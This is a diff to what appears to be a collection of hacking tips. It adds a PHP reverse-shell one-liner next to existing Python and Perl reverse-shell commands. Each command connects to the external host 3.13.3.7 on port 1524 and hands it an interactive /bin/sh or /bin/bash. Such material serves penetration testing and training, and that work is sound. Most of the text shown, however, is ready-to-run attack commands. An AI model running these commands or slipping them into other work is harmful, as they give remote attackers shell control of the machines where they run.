@@ -30,6 +30,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
       1. [without Bash](#rswob-anchor)
       1. [with Python](#rswpy-anchor)
       1. [with Perl](#rswpl-anchor)
+      1. [with PHP](#rswphp-anchor)
    1. [Upgrading the dumb shell](#rsu-anchor)
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
@@ -291,6 +292,12 @@ $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.S
 $ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 # method 2
 $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+```
+<a id="rswphp-anchor"></a>
+**5.i.e. Reverse shell with PHP**
+
+```
+php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 <a id="rsu-anchor"></a>
